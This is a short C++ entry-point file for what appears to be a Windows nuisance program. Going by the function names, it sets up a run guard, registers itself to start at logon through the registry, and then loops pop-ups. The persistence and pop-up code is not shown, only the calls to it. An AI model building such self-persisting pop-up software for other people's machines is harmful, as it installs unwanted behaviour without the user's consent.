#include "PopUp.h"
#include "Presistence.h"
#include "Resilience.h"
#include <iostream>
#include <windows.h>

int main(int argc, char* argv[]) {
    try {
        RunGuard runguard;

        CurrentProcRegistryLogon();

        PopupLoop();

    } catch (const RunGuardException& error) {
        std::cerr << "RunGuardException: " << error.funcName << " \n";
        return 1;
    }
    return 0;
}
